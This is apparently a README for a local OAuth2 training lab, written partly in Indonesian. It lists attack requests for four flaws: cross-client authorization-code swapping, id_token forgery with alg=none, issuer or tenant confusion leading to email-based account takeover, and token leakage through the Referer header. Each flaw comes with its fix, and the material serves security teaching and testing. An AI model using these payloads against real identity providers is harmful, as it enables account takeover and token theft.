# OAuth2 Deep-Dive Lab — payload request set

## s1 — cross-client code swap
```bash
# 1) victim dapet code via web-app
curl -G 'http://127.0.0.1:5090/oauth/authorize' \
     -d client_id=web-app -d redirect_uri=http://127.0.0.1:5090/app/cb \
     -d response_type=code -d scope='profile email' -d state=x

# 2) attacker tukar code pakai evil-app
curl -X POST 'http://127.0.0.1:5090/oauth/token' \
     -d grant_type=authorization_code \
     -d code=<CODE_VICTIM> \
     -d client_id=evil-app -d client_secret=evil-secret \
     -d redirect_uri=http://127.0.0.1:5090/evil/client/cb
```
RENTAN: token owner = victim. FIXED: `invalid_grant` (code binding mismatch).

## s2 — id_token alg=none
```bash
# forge id_token (header {"alg":"none"})
# <payload base64url> = {"iss":"https://id.corp-test.local","sub":"victim",
#                        "aud":"web-app","email":"victim@corp.test","email_verified":1}
# token = b64(header).b64(payload).
# kirim ke callback client / token exchange sebagai id_token
```
RENTAN: diterima → login victim. FIXED: `alg "none" tidak diizinkan → ditolak`.

## s3 — issuer / tenant confusion
Genuine id_token signed by attacker tenant (attackercloud.io) hammering email korban:
```
iss = https://id.attackercloud.io  (bukan id.corp-test.local)
email = victim@corp.test  (akun attacker yg SAH di tenant-nya, verified=1)
```
RENTAN: app menautkan by email → masuk victim. FIXED: `iss tidak terdaftar → ditolak`.

## s4 — implicit grant token leak via Referer
```bash
# victim login implicit
curl -G 'http://127.0.0.1:5090/oauth/authorize?response_type=token&client_id=web-app&redirect_uri=http://127.0.0.1:5090/app/implicit/cb&scope=email'
# -> URL callback membawa #access_token=...
# callback JS mempost token ke /app/profile?token=<access_token> -> token di query string
# halaman itu memuat <img src="/evil/ref"> -> Referer berisi URL+token -> dibaca /evil/ref
```
RENTAN: /evil/ref menangkap token. FIXED: code flow (token via POST) + `Referrer-Policy: no-referrer` → tidak ada yang bocor.

## API
- `POST /api/toggle/<s1..s4>` body `{"vulnerable": true|false}`
- `POST /api/poc/<s1..s4>` — jalankan exploit tercript
- `GET /api/state`